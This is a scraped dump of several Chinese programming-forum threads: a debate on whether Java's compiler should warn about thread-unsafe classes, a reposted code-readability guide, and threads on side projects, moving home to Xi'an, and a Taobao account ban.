"\r", "当我们谈论装软件的时候总有一个讨论点 : 有没有病毒. 当我们谈论病毒的时候我们在谈什么? 什么 360\\杀毒软件\\主动防御\\HIPS\\安全管家\\安全助手等等等等....\r", "\r", "SO...\r", "\r", "妈蛋,能不能先把 Windows 中成千上万的软件中,哪些没有病毒的给苦逼的用户标注出来先? 原罪啊... 老司机都表示不淡定了...", "不太懂你，病毒又不是微软产的", " 亏你打这么多,本质没理解. JDK 是原生的,直接给开发人员使用的,病毒是 windows 中原生的嘛? 明明是第三方编写并传播的,要反思的是 windows 的内部机理吧... \r", " 不是不满足,只是不明白既然引入了多线程,为什么不把基础类库做的更好一点,比如编译的时候能识别某基础类库在多线程环境下会有问题,出现个警告之类的....而不用人去\"趟坑\",然后把结果和过程称之为\"开发经验\"或\"血泪教训\";\r", " 基础类库是不是太多了点,我反正没有全部看完\r", " 知音\r", " 我并不是抱怨线程安全问题\r", " 我水平一般\r", "  这是实话\r", " 其实只是不明白既然引入了多线程,为什么不把基础类库做的更好一点,比如编译的时候能识别某类库在多线程环境下会有问题,出现个警告之类的....而不用人去\"趟坑\",然后把结果和过程称之为\"开发经验\"或\"血泪教训\";", " 只能说还完全没懂我意思", "joda-time 和 stringbuffer", "楼主之前写啥语言的。", " \r", "线程安全是跟程序员的设计有关\r", "并不是说类库在多线程情况下就一定有问题。而是可能出现意料外的情况，但是在正确的设计中，即使是多线程环境，一些所谓的非线程安全的类库也不会产生 意料外 的情况。而这时候编译器抛出 warning 就有点。。。了\r", "\r", "所以这个属于业务逻辑问题，锅在程序员，跟编译器关系不大。", " 那什么是正确的设计?把线程安全的方方面面都全部搞懂后设计出来的程序就是正确的设计了?很多业务复杂的多线程环境,基础类库经常出现隐性的深层次问题,调起来非常的伤神.这个不否认吧. 我觉得出 warning 多好,即能淘汰旧 api,也能迫使开发人员知识体系升级,还减少出错,一举多得!", " 所以你也说了，这是“你觉得”\r", "\r", "同步不是百利而无一害的，它是有代价的，这是由程序员自己决定的，是否使用读同步，写同步。这些都是有代价的。\r", "打个比方，在外部条件的约束下，也许是多线程中使用非线程安全的类库，但是却能保证不出问题\r", "\r", "再打个比方，一个数据结构中，多个线程共用，但是每个线程负责不同的部分。此时有使用读写同步的必要么。\r", "\r", "诸如此类的情况太多了，这应该是程序员去关心的业务具体展示，而不是编译器关心你的算法", " 而且更重要的是，所谓官方的线程安全，很可能跟你业务所需要的线程安全，是有差异的。类库的线程安全是不能实现你需要的效果的。\r", "最简单的比方\r", "\r", "public static void main(String[] args){\r", "    while(true){\r", "        for(int i = 0; i<10; i++){\r", "            vector.add(i);\r", "        }\r", "    }\r", "\r", "    //一个线程删数据\r", "    Thread removeThread = new Thread(new Runnable(){\r", "        @", "\r", "        public void run(){\r", "            for(int i=0 ; i<vector.size() ;i++){\r", "                vector.remove(i);   \r", "            }\r", "        }\r", "    });\r", "\r", "    //一个线程读数据\r", "    Thread printThread = new Thread(new Runnable() {\r", "        @", "\r", "        public void run(){\r", "            for(int i=0 ; i<vector.size() ;i++){\r", "                System.out.println(vector.get(i));\r", "            }\r", "        }\r", "    });\r", "\r", "    removeThread.start();\r", "    printThread.start();\r", "\r", "    //防止过多线程，内存溢出\r", "    while(Thread.activeCount() > 20);\r", "}\r", "\r", "\r", "上述代码就会产生意料外的情况，那么 Vector 是非线程安全的么？\r", "\r", "\r", "代码来自： ", "题主想法是好的\r", "在 《 Java 并发编程实战》这本书中就大量使用了这个方法使用的是标注，附录中也有详细描述", "经常是这样的：除非特别说明，都是线程不安全的。\r", "来我们 rust 吧，仍然是除非特别说明都是线程不安全的。不过我们的线程安全在类型中被标出来了，因此编译器会检查一些情况，比如数据竞争。", " 主要还是怕踩坑。好的设计当然是不用说的。\r", "打比方来说 c 里面有个根据 DNS 获取 ip 的 API ，就有线程不安全版的，如果没有标注的话，就直接掉进去了，总不能所有东西都加锁吧？", " 虽然你说的没错，但是感觉你有点曲解了楼主的意思ˊ_>ˋ感觉楼主只是想方便快捷的知道哪些是线程安全的哪些不是而已，这样就不用用个啥就提心吊胆的吧～", " 用的时候，每个类的注释是有写的吧。", "在多线程环境中，非线程安全的类不一定就有问题啊。。。。", " 自动完成以及提示\r", "比如说 NetBeans 可以按住 ctrl 和类的名字看当前类的注释，一般线程安全和非线程安全都是用粗体字标记，应该已经够简单了吧=。=\r", "\r", "我只是认为，这个操作不应该由编译器进行 warning", "楼主应该去写 rust", "只能慢慢适应。其实看一下源代码很快就可以判断是不是线程安全的嘛", " 言简意赅,知音,哈哈\r", " 示例没毛病,@Citrus 表达了我的意思,假如我是一个小白,先不管业务逻辑,代码中不是用的 vector,是用的 arraylist,如果编译器出警告说:在多线程环境中用 arraylist 不安全,建议切换 vector,同理 Integer 建议切换成 AtomicInteger 是否会更好?\r", " 知音,哈哈.\r", " 有空了解一下.谢谢!", "可是编译器怎么知道你这个 ArrayList 会不会用在多线程环境中。。如果就用 ArrayList 存数据，不去修改的话，事实上这个 ArrayList 也是线程安全的，编译器也要告警应该用 Vector ？", "《多处理器编程的艺术》", "没写安全的，就是不安全的，即时某个版本实现的安全，也可能随时改变。", "Junior Coder ：这什么辣鸡编译器(IDE)，怎么不把所有老司机约定成俗的东西都提示出来(我又不是老司机)，使用的时候又不想看文档，也从不看源码，你不提示我怎么知道，是不是看我掉坑里很开心？？\r", "这辣鸡*DK ，你只要告诉我怎么用就好了嘛，最好再带上几个不同版本的业务示例。\r", "\r", "开心就好", "lz 还是太懒了...\r", "\r", "当年..我学 java 的时候....一个月(闲时)把所有类包看完....", " :) 可能开源就是这德行吧...\r", " 皇上,还记得当年湖畔的夏雨荷 JPEGHuffmanTable 是不是安全的?\r", " =和==都知道,何况 thread 和 runnable 上下文环境,编译器肯定有办法,再者换成 vector 也不是错啊,哪天业务变更,说不定 vector 更安全不是?", "关 JDK 什么事，这是 JVM 的事吧", "1. 要是编译器这个都知道，就能帮你在可能发生 race condition 的地方自动加锁了，显然是不可能的。\r", "2. 那按照你的说法， JDK 不用 ArrayList 了？大家一起用 Vector ？", " IDE 就应该尽最大可能去辅助程序员，这没有什么不对。如果能够有办法让人不看文档不搜索就很容易的根据 context 给出提示／警告／报错，不正应该是工具要去做的事情么？\r", "\r", "觉得 LZ 说的有理，那么多冷嘲热讽偏离主题的...", "ide 真达到这种底部，还要程序员干啥？", "单纯的能力问题，你觉得要怎么告诉你哪些安全哪些不安全才行？  doc 上面写着够不够？", "Java 有两大开发工具，一个叫 JDK ，一个叫 OpenJDK"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>什么叫可读性</h1>\n<p>曾经看到过这样一句话「别人在阅读代码过程中飙脏话的频率是衡量你代码质量的唯一标准」。</p>\n<p>代码的可读性其实不是针对的编译器、解释器，而是对于人来说的。具有良好可读性的代码，应该是能让人快速理解、轻松维护、容易扩展的。</p>\n<p>相信大家都有过维护别人代码的经历，如果各有各的风格，而没有遵循一定的规范和约定的话，那真的是挺痛苦的一件事。当然，既然编写代码被称作是一种艺术，那难免会有多样性。所以这里不会有太多「极端」的要求，只是提出一些建议和判断标准。</p>\n<h1>怎样提升代码可读性</h1>\n<p>这里主要从三个方面说明如何提升代码的可读性：</p>\n<ul>\n<li>表面层次的改进。</li>\n<li>简化逻辑。</li>\n<li>重新组织代码。</li>\n</ul>\n<h2>从表面层次改进</h2>\n<p>表面层次的改进是指：选择合适的名字、写清晰的注释、将代码整理为更好的格式等等很容易应用的方式。</p>\n<h3>选择合适的名字</h3>\n<p>当我们在代码中给方法、变量等命名的时候，应该遵循「将信息装入名字 」这一原则。</p>\n<p>要将信息装入名字就需要我们在命名时选择专业的词，避免空洞、泛泛的词。比如，单字母、 tmp 、 buf 等无意义的词。当然在循环中大家已经习惯了用 i, j 等来表示索引，所以在这里也可以延续习惯。</p>\n<h3>写清晰的注释</h3>\n<p>注释应该是说明代码的意图，而不是简单的复述代码的行为。当我们在写注释时，应当是从更高的思维层次上来说明编写这段代码时的想法，就像是一个作家在阐述自己写作时的想法一样。\n比如：</p>\n<pre><code>// 对于这些数据，二叉树要比哈希表快得多。\n</code></pre>\n<p>千万不要只是写一大段谁都能从代码里看出来的废话。</p>\n<h3>更好的代码风格</h3>\n<h4>代码宽度</h4>\n<p>目前主流的代码规范都推荐代码宽度保持在 80 为宜，这么做当然是有历史原因，但在现在也还是有其实用价值的。因为将代码宽度限制在 80 ，是在需要打印代码的时候，完美适配 A4 纸的宽度。即使只是将代码贴在个人博客或在线网站上，这也是最适合代码阅读的宽度。当使用大屏显示器编程时，这个宽度也是很适合分屏工作的。</p>\n<h4>列对齐</h4>\n<p>在这里笔者不推荐使用「列对齐」，比如：</p>\n<pre><code>var name     = \"name\";\nvar location = \"location\";\nvar phone    = \"phone\";\nvar url      = \"url\";\n</code></pre>\n<p>因为列对齐看起来确实还不错，让代码的阅读更轻松了些，但这样建立和维护对齐的工作量很大，当某一行有了些细微的变动，其他很多行也要跟着动，而且大部分都还只是空白。当然，如果你觉得这样做的工作量还可以接受，也是可以试一试的。</p>\n<h4>代码顺序</h4>\n<p>在组织方法的时候，应该遵循一定的逻辑顺序。但具体要遵照什么逻辑顺序，是可以按照自己的想法的，比如，从「重要」到「不重要」、按字母顺序排序等等。但最重要的是要一直坚持已有的风格，不一致的风格比没有风格更让人混乱。</p>\n<p>这里也介绍一些好的代码风格：</p>\n<ul>\n<li><a href=\"https://github.com/google/styleguide\" rel=\"nofollow\">Google 的代码风格</a>：包含 C++、 Object-C 、 Java 、 Python 、 R 、 Shell 、 HTML\\CSS 、 JavaScript 、 AngularJS 、 Common Lisp 和 Vimscript 。</li>\n<li><a href=\"http://standardjs.com/\" rel=\"nofollow\">Feross JavaScript 代码规范</a>。</li>\n</ul>\n<h2>简化逻辑</h2>\n<p>每当你看到一个复杂的逻辑、一个巨大的表达式、一大堆变量时，你就应该思考应该怎么优化它们。因为这些都会增加你头脑的压力，要知道每个人的短期记忆都是很有限的。当你不得不思考过多的事情时，很可能在不知不觉中就产生 bug 。\n这里介绍几个简化逻辑的方法：</p>\n<ul>\n<li>\n<p>拆分复杂表达式。要拆分复杂表达式，可以使用「解释变量」的方法。比如：</p>\n<pre><code>if line.split(':')[0].strip() == \"root\"\n</code></pre>\n</li>\n</ul>\n<p>这里我们可以加入一个额外的解释变量：</p>\n<pre><code>  username = line.split(':')[0].strip()\n  if username == \"root\"\n  ...\n</code></pre>\n<ul>\n<li>德摩根定理。 如果你学过「电子电路」这门课，那你一定对德摩根定理有印象。也就是对于一个布尔表达式，有两种等价写法：\n<ul>\n<li>(not a) and (not b) and (not c) = not (a or b or c)</li>\n<li>(not a) or (not b) or (not c) = not (a and b and c)\n你可以用德摩根定律来让你的布尔表达式更具有可读性。</li>\n</ul>\n</li>\n<li>尽可能简化变量。对于变量的使用，主要有三个需要注意的地方：\n<ul>\n<li>变量越多，越难全部追踪它们的动向。</li>\n<li>变量作用域越大，就需要跟踪它们的动向越久。</li>\n<li>变量改变得越频繁，就越难跟踪其当前值。</li>\n</ul>\n</li>\n</ul>\n<h2>重新组织代码</h2>\n<p>重新组织代码俗称「重构」，没有把握时不要轻易使用。这里介绍几个简单常用的方法，进阶的话可以去看《[重构：改善既有代码的设计]( <a href=\"https://www.amazon.cn/%E9%87%8D%E6%9E%84-%E6%94\" rel=\"nofollow\">https://www.amazon.cn/%E9%87%8D%E6%9E%84-%E6%94</a></p>\n<p>%B9%E5%96%84%E6%97%A2%E6%9C%89%E4%BB%A3%E7%A0%81%E7%9A%84%E8%AE%BE%E8%AE%A1-%E7%A6%8F%E5%8B%92/dp/B003BY6PLK)》这本书。</p>\n<p>这里简单说说三种组织代码的方法：</p>\n<ul>\n<li>抽取不相关的子问题。也就是要积极发现并抽取出不相关的子逻辑，在看某个代码块时，问问自己这段代码能不能抽取到独立的函数中。要知道「所谓工程学就是把大问题拆分成小问题再把这些问题的解决方案放回一起」，在编程过程中我们也应当经常拆分大问题，这能让你的代码更健壮和易读。</li>\n<li>一次只做一件事。同时在做几件事的代码会让人很难理解，一个代码块可能会做初始化对象、解析输入、在界面展示。过多的不同业务代码纠缠在一起，会让你很难清楚理解它的逻辑。因此，我们应当将代码组织的尽可能清晰，我们不仅可以将一个大函数拆分为多个小一些的函数来区分边界，也可以在函数内部组织代码，使得其感觉上像是有分开的逻辑段，就像下面这张图片展示的一样。</li>\n</ul>\n<p><img alt=\"图片来自于「编写可读代码的艺术」\" src=\"http://upload-images.jianshu.io/upload_images/75603-20e412086c9acedf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<ul>\n<li>把想法变成代码。其实检验代码可读性最简单的方法就是看看自己能不能很简单的将代码解释给别人。当人在解释一件复杂的事情时，最容易发现自己没有完全理解的小细节。能够用「自然语言」解释想法是很有价值的一个能力，这需要把一个想法归纳成精炼的概念，这不仅能帮助他人理解，也有助于自己把这个想法想得更清晰。\n这里介绍一个简单的过程来锻炼你的这项能力：\n<ol>\n<li>像对着一个同事一样用自然语言描述代码要做什么。</li>\n<li>注意描述中所用的关键词和短语。</li>\n<li>尽可能写出与描述相匹配的代码。\n当然看起来很简单，但其实是需要很大量练习的，更重要的是要有这方面的意识。</li>\n</ol>\n</li>\n</ul>\n<p>提升代码质量和可读性其实是一件挺困难的事，上面介绍的也都只是些比较粗浅的技巧。这里也介绍一些系统的读物，大家感兴趣可以去看看：</p>\n<ul>\n<li>\n<p><a href=\"https://www.amazon.cn/%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8-%E5%8F%B2%E8%92%82%E5%A4%AB%E2%80%A2%E8%BF%88%E5%85%8B%E5%BA%B7%E5%A5%88%E5%B0%94/dp/B0061XKRXA/ref=sr_1_1?ie=UTF8&amp;qid=1473057069&amp;sr=8-1&amp;keywords=%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8\" rel=\"nofollow\">代码大全（第二版）</a></p>\n</li>\n<li>\n<p><a href=\"https://www.amazon.cn/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93-%E9%A9%AC%E4%B8%81/dp/B0031M9GHC/ref=sr_1_8?ie=UTF8&amp;qid=1473057069&amp;sr=8-8&amp;keywords=%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8\" rel=\"nofollow\">代码整洁之道</a></p>\n</li>\n<li>\n<p><a href=\"https://www.amazon.cn/%E9%87%8D%E6%9E%84-%E6%94%B9%E5%96%84%E6%97%A2%E6%9C%89%E4%BB%A3%E7%A0%81%E7%9A%84%E8%AE%BE%E8%AE%A1-%E9%A9%AC%E4%B8%81%C2%B7%E7%A6%8F%E5%8B%92/dp/B011LPUB42/ref=sr_1_3?ie=UTF8&amp;qid=1473057069&amp;sr=8-3&amp;keywords=%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8\" rel=\"nofollow\">重构:改善既有代码的设计</a></p>\n</li>\n</ul>\n<blockquote>\n<p>作者： Hevin - 极光（ JPush 为极光团队账号，欢迎关注）</p>\n</blockquote>\n<blockquote>\n<p>原文：<a href=\"http://www.jianshu.com/p/39517a8c66bc\" rel=\"nofollow\">代码可读性指南</a></p>\n</blockquote>\n<blockquote>\n<p>知乎专栏：<a href=\"https://zhuanlan.zhihu.com/jiguang-daily\" rel=\"nofollow\">极光日报</a></p>\n</blockquote>\n</div></div>"], "reply": "8", "tittle": "代码可读性提升指南", "comment": ["```\r", "var name     = \"name\";    \r", "var location = \"location\";    \r", "var phone    = \"phone\";    \r", "var url      = \"url\";    \r", "```\r", "\r", "一般好的编辑器可以按住 alt 实现纵向选中，然后所有行一起编辑，比如加空格之类的。", " 我也是这么觉得， sublime text 按 tab  他就会把右边的值 对其到 tab 的整数位上", "用一阵子 golang 自然就好了。\r", "刚开始是看上 golang 传说中的高性能和打包成一个文件的部署便利性，但是被 fmt 调教后，更喜欢 go 了。", "但是用上 var xingming=“ xingming ”就很尴尬了", " 比 var xm = 'xm'要好多了", " 感觉没有必要强制追求列对齐", " 可是那样看起来炒鸡儿爽啊", "我觉得这篇文章的题目应该是：《编写可读代码的艺术》—读书笔记。大家更应该看看这本书，受益匪浅"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>python</p>\n<p>很长一段时间比较闲，但是却没主意。。。</p>\n</div></div>"], "reply": "22", "tittle": "想写点代码，却不知道要写什么了。。。。", "comment": ["懒癌心魔\r", "\r", "别怕，我也有", "写个 telegram bot ？", "就是不想写的意思。。。", "hello world", "很简单，你可以去威客网或者外包群里找个需求，自己写看下能不能实现。", "写一个司机相关的吧， 233", "想要一个知乎日报 twitter 机器人。", "+1 不想写就看书吧……", "最近在看 lua 的源码，你也可以试试", "标准答案 写个爬虫吧。。", "去爬爬 pornhub 之类的网站造福人类吧", " 老司机", "写个房地产预测软件", " #7 知乎日报要什么，我之前写了一个", "就像练字一样 为了把字写的更漂亮", "写一个自动编程软件来帮你写", " 要不然学习 python 有何意义", "代码，要不要写？怎么写？", "hello world", "重构旧代码。", "抓黄图", "抓秋名山飙车老司机"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>楼主杭州读书杭州工作， 14 年毕业至今待过两家公司。前不久刚刚提出离职，现在纠结要不要回西安发展，家里也希望能尽早的回到家那边，好买房结婚什么的，就定下来。杭州孑然一身无牵无挂，西安朋友家人都在那边。但是西安那边的工资低一点而且互联网氛围和杭州没得比，所以楼主现在纠结要不要回去......</p>\n</div></div>"], "reply": "143", "tittle": "辞职了要不要回家，纠结 ing", "comment": ["本来你可以用这个贴顺带 po 点自身条件征婚的，可是你没那么做，这说明你暂时还不想结婚或者你不喜欢女朋友，那么就回家吧。😉", " 是啊，这行情说涨就涨", " 暂时确实不想结婚", " 为什么要回来呢？", "首先，人不只是为了自己而活着，考虑下你的后代在哪个城市成长比较有利，另外，朋友（人脉）这种当你在一个城市呆久了就自然会有不用担心，家人，你是独生子女需要你照顾？需要就安排以后接过来，如果你想你的后代慢慢往大城市发展，就该为下一代打下基础。\r", "\r", "btw ：孑然一身无牵无挂，这是最好最自由的状态。", " \r", "1. php 去哪（起码是个二线）都好找工作啊\r", "2. 找对象和地点无关，我就是北漂找的对象", "建议回去。\r", "纯个人判断。", "同西安人，目前刚毕业在北京干程序员，也打算 2-3 年后回去。家人对象朋友都在那，北京除了工资高确实没有任何牵挂。要不要回去还是要看你打算在哪成家啊，反正我是打算在西安成家，所以必须得回去，而且西安消费也不高，对我来说比较适合。", " 赞同你的观点", "在外面呆久了就真的回不去了，同是西安人，在上海工作 4 年多了。", " 嗯，终究还是要回去的只是时间的问题。", "欢迎回大西安呀，楼主做哪方面的", "外面待累了，就回家吧。", "同为 PHP ，同为西安人在外地。\r", "15 年毕业。\r", "\r", "回去不至于毁了，\r", "西安有家人有老朋友的。\r", "买个车买个房找个女朋友，周末咥碗泡馍挖个坑打打麻将也挺好的么😂\r", "\r", "可以考虑换个语言去 ThoughtWorks 或者华为，要么就去某些新互联网公司也有还行。", "的确做人做事一定要靠谱负责，第一要负责的就是要对自己负责啊。\r", "\r", "把他人没实现的任务理想，被迫 /主动 自己背上，不仅对自己不负责，也是对他人不负责。\r", "\r", "大家都是成年人，想去哪，想做什么，想过怎样的生活，自己主动选择吧。\r", "\r", "别委屈他人(自己之外的所有人)，更别委屈自己，毕竟自己这一生也只有自己来完全体验。", "早点回，赚大钱的少数", "不求非要买房，不求非要结婚生子养老，跳脱这种传统，那么瞬间天地就大多了哎。", "和楼主相反，在西安待了一年多以后，去了杭州，在我看来，西安这个城市生活是相当安逸舒服的（雾霾不小），但是整体的经济环境、人的思维和做事方式、技术公司的质量都是要比一线城市差的。商业环境活跃的地方会有更多的机遇和不确定因素，这是我所看中的。对做技术的人来说，平台还是比较重要的，建议楼主可以回去面几家好些的公司，实地感受下。", " 衣不如新人不如故，老朋友家人都在那边。回去的话至少不会像在杭州这样平时宅着了%>_<%\r", " 难啊，到了一定的年龄段各种压力不得不来\r", " 嗯，可以过段时间可以先去西安面试下感受下。反正辞职了先好好休息下在找工作，就去西安好好的体验下", " 来我司试试不？", "一个月赚不到 1 平的话，还是赶紧回吧，别浪费光阴", " 年龄不是问题，关键还在自己意志了，被人逼着 /教唆着选择，最后这人生可还是得自己过。", " 北上广深地王标段，壕别墅，学区房，一平米几十万不鲜见，月收入能达到这个标准的技术人太少，都要回家了嘛？", " 你司招啥的？我现在做的不是主流语言。数据库开发、数据仓库、报表模型(⊙﹏⊙)b", " 攒了点钱，打算回去买房子啥的，反正在深圳是买不起，所以还是决定回去了，还没女朋友呢，这种事情，建议你稳定下来再找，不然会很麻烦", " 现在招 FPGA ， PHP 后端，前端，开发 DBA ，嵌入式，单片机， C#， QT 。", " 我司有不少从一线城市回来的，大家经历和思考的过程都比较相似吧~我也是从北京回西安的", " 可以哇，你司叫啥我去智联招聘看看有没有合适的岗位 O(∩_∩)O~~", " ", " 可能不太全，可以给我个邮箱，发个完整的职位列表给你", " 好的我先瞅瞅，邮箱 ", " ， 3q", " \r", "一毛一样。过年回家天天约都约不完。\r", "平时在上海周末就是宅着。", "建议越早想清楚越好.而非楼上有的 v 友建议的再呆 2 年.\r", "\r", "因为一个人的发展并非只是单纯的技术.还有交际圈子,人脉关系.年龄在我大天朝大部分企业来讲,也是一个比较敏感的话题.\r", "\r", "要是没想清楚再过 2 年换一个城市.年龄大了不说.交际圈子,人脉关系要从头再来.发展的可能性就比较小了.", " 是啊，离家太远一年只能回一次，回去约都约不完。平时在这边周末如果有个同学聚会或者玩玩什么的还行，平时基本宅着外卖。。\r", " 嗯，的确是这样的。年龄大点儿挪动起来不方便了，朝气锐气也消沉了", " 已发", " 更正，没信心一个月赚到一平均价的话", "同楼主的状况 我也在考虑回去还在去深圳", "回吧，迟早要回的", "我是在成都工作。。家里想让我回长沙。最后的办法是继续留成都工作。房子先买在长沙。想回去了有房。不想回了卖房", "想回家也没啥大不了的，咱北方人都有那“故土难离”传统。", " 之前没有考虑过一直逃避但是随着时间的推移不得不去考虑这件事儿了\r", " 房子卖了基本就稳点儿了\r", " 是的，归属感这东西很重要", "去西安 IBM 吧，有个同学在那边，日子过得比我这个杭飘强不少", " 各个招聘网站都看了，没见到 IBM 有什么职位招聘的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>第一次登陆闲鱼卖点东西, 发完过了会再看，居然被限制登录，登陆淘宝主页，告知被永久封禁。。。</p>\n<p>找在线客服，机器人完全不顶事, 还把机器人骂哭了</p>\n<p>找人工吧，需要登陆，我已经登陆不了了好不！！！</p>\n<p>打电话吧，绕来绕去还是机器人，需要提供违规编号，还耐心的引导从哪点点点能看到，点两下就发现，我被死循环困住了，又要登陆啊！！！</p>\n<p>今天闲了上知乎搜了搜，还挺多这种情况的, 有好多人去这里投诉了。但看起来是淘宝系统认为账户不安全，给做的封禁，客服人员完全无法干预，这个系统感觉很草率地就能做出决定。。。</p>\n<p><a href=\"http://ts.21cn.com/tousu/show/id/101664\" rel=\"nofollow\">http://ts.21cn.com/tousu/show/id/101664</a></p>\n<p>这是别人的投诉过程，很失望，只能重新注册淘宝</p>\n<p>回想一下什么原因违规了，发布商品要上传图片，我在网上找了一张官网的放上去了，就因为这被投诉举报了？至于么？\n感觉像是小孩子吃饭打碎了碗，立马把小孩子杀了，再重新生一个。</p>\n<p>而且支付宝还绑定到淘宝账号了，都没法解绑，越来越不靠谱了</p>\n</div></div>"], "reply": "73", "tittle": "淘宝是不是想完蛋？", "comment": ["被封这事没什么好说的，一定是有问题的\r", "\r", "没有无缘无故的爱，也没有无缘无故的恨", "淘宝一点保障都没有。\r", "\r", "之前在淘宝因为脑子一热被人骗了几百块钱，找客服，客服让去淘宝 110 报案，报案还必须确认收货才能报案。举报店铺，还找不到诈骗的选项。最后确认收货提交上报案了，然后也没有下文了。", "怎么把机器人骂哭？", "同问楼上", " 想必是买的虚拟物品？你这个情况，我估计警局都不想给你立案，影响破案率的", "期待第二家淘宝", " 什么叫有问题嘛，我的账号一样有神奇的问题 ，从没开过店，然后莫名有天提醒我交易违规，而且是作为卖家交易违规。自从从亚马逊转到二手东以后，淘宝除了偶尔买点电子元件，基本不用，更别说卖东西了。\r", "当时觉得很神奇，就上去找客服询问，回答只是不停的道歉，说是机器人误判之类的。\r", "我只觉得这个系统设计的脑洞挺大的。", " @", " \r", "贴不了图，文字演示吧，描写地稍稍夸张了点～\r", "\r", "                                                     访客：账户封禁\r", " 象仔：\r", "亲，您的账户遇到了什么问题呢？\r", "                                                     访客： 滚\r", " 象仔：\r", "象仔错了，亲亲不要生气 o(>﹏<)o 。\r", "我会好好学习，努力变得更厉害的嗯！", " 不要因为阿里店大就以为它们不欺客，封没问题，总得留条后路，给一个解释的机会么", "以前用我自己的身份证照给未成年的亲戚的淘宝号开店，结果我这边的号收到了卖家违规行为的警告……而我的号根本没成为卖家。不知道什么原理", " 确实，阿里像是对小部分人被误判也不在乎了", "店大欺客，楼主试试 58 同城旗下的二手交易 App ：转转\r", "\r", "二手东也开了二手交易转让的，网易好像也有二手交易的，阿里自己作死，那就让他死好了。这个闲鱼本来是淘宝二手，现在阿里可能是想把二手交易这一块打造成一个独立产品，一步步作死，开始是改名叫闲鱼，然后就开始各种限制，只能用手机发布商品，然后进一步只能用手机查看商品评论，中间可能是用户反应太多，掉粉掉的厉害又改回来了，现在是只能手机发评论，网页版不能发只能看。\r", "\r", "逼着你用移动端，要是你不小心运行这货推送，跟阿里全家桶一样一样的体验哦。总之，让其自然 go die 吧。", " 没错，用转转很快就出手了，使用过程中都有提示，如何描述商品，图片有什么要求，一眼都能看到。\r", "后悔当初想要尝尝鲜跑去了闲鱼，天猫超市物流比较快，是我唯一放不下的了，为了它还是得重新注册个淘宝账号，再想办法把支付宝从被封的账号解绑过来，一堆麻烦事儿\r", "\r", "阿里也搞全家桶啊，莫非百度的跳槽过去了？", " 两个号可以绑同一个身份证了吧？ 不过即便这样也是莫名其妙", " 解绑不了的吧？", "我的也被永久封停 而且支付宝不能解绑", "其实不止淘宝，很多网站都会有一些类似这样的死循环操作，\r", "而且还有可能遇到“假”客服！", "淘宝的客服一直就是这么坑爹，每次去都有一种想把客服打一顿的冲动....", " 315 快到了，不知还能不能赶得上", " 有些惨的, 用淘宝账号登陆支付宝，钱都取不出来", " 堵住耳朵不想听～ 顾客找不上门, 他们可能都挺高兴，投诉少了，绩效也上去了", " 哈哈，现在应该有激动到去总部打客服的人了", "话说马云有没有邮箱啊，发邮件给他。\r", "苹果不是经常出这儿样的新闻吗？", "我是说苹果 ID 被盗，发邮件给苹果老大，马上就能搞定，发邮件给马云不知道行不行的通？", " 咸鱼这套系统没有误判 BUG 的话，我吃键盘。我就看过好几个人说无故被封了", " 邮箱还不如直接去杭州堵大门", "我也是这一样，中午贴图上一个详细点的帖子", "我也有一个账号被封禁。您大概是当时 CSDN 密码泄露，淘宝和 CSDN 的密码是一样，有人拿着我的账号可能做了什么坏事。此外，我想不到其他的理由啦！", "我来说下真相吧 其实你们所找的那些支付宝客服和淘宝客服都是大学生兼职的 统称云在线 所以问客服是解决不了任何问题的 因为兼职的大学生都是机械性的回答问题 有事直接打电话去咨询电话客服 我的一个号也是被封了 是买家号被封 30 天以后永久登录 我曾经为了这个事情联系 陆陆续续的联系了差不多 1 年的淘宝客服 都是告知无法解决 所以不要想着能解封了 但是我很费解的是 我有一个同学 卖家功能受限 但是买家功能却没事 阿里的逻辑系统不是正常人能写得出来的", "机器人骂哭了，它不短路了么，楼主大仇已报还嚷嚷啥？", "然而你无可奈何", "脑补场景：本来解封了的，结果你把机器人骂哭了，加封一年  ", " ", " 期待大作", " 我的纯粹是闲鱼卖东西被搞的。淘宝账号密码在我的所有密码里唯一。", " 这么下去，迟早得完，被封的人只会越来越多，不定哪天封了个大 v 呢", " @", " 要不要这么逗, 我已经被永久封禁了, 鞭尸无效～", "在淘宝上卖东西越来越不爽了，动不动就下架。", "不知道楼主卖的是什么东西", "你是多凶，能把机器人骂哭？", "就是因为客服原因我基本就没在淘宝买常见物品了，阿里系根本就没有客服，阿里云的客服甚至算是阿里系里面比较好的。", " 支付宝和淘宝是独立的 不影响使用吧 只是像天猫 淘宝 口碑都用不了而已", "话说现在没有互联网公司做第二家淘宝吗，淘宝已经不是原来的万能淘宝了，各种东西不给卖，账号乱封。期待第二家淘宝诞生。", "之前买过一个手机屏幕，刚装上测试点亮就花屏，申诉退款退货，然而店家不同意，最后申请小二介入。\r", "当时一个杭州号码打过来差点没接。\r", "\r", "最后达成意见：退款但是货不用退了。\r", "不过电话里的意思：退款后，我之前的申诉会被当作撤销处理，不知道有没有什么问题。", "感觉各种网络产品，机器人客服就是扯淡。 \r", "还有各种第三方的支付手段，微信，支付宝， apay 这些，都是扯淡。 \r", "然而现在的潮流，大众就是这样，满满的这些提供商的态度就是：用不用？用就别比比，你不用就滚，别人还着急用。 \r", "无奈只能随大流。", "所以在闲鱼卖东西还是用小号吧，听说过几个在闲鱼卖路由提到可翻墙就被封号的案例", "违规，并且遭人投诉，这种情况会封号（买卖虚拟物品，违禁品，烟，危害国家信息安全的）\r", "判定标准，商品描述，商品名称，闲鱼交易，聊天对话出现风险提醒的次数。 比如你输入微信， steam ，枪什么的，一刀切，被人投诉肯定被封。", "都被封了十多年的默默看看，没有并不影响生活啊。", "微笑，然而基本上不会用淘宝家的任何产品。\r", "大概是这家企业的价值观有问题。", "账号违规了。从描述看，是盗用品牌图片，被品牌投诉。这个各大品牌也在用机器人扫描的。还有用户直接用淘宝的“转卖”功能也被封了的...能找到活人客服就可以处理。\r", "\r", " 这套逻辑是没问题的，问题是淘宝把这套监测专业卖家的逻辑用在了低频次的二手交易商（当然闲鱼二道贩子非常多这些人用这套规则是恰当的），伤了很多不知情的用户。比如 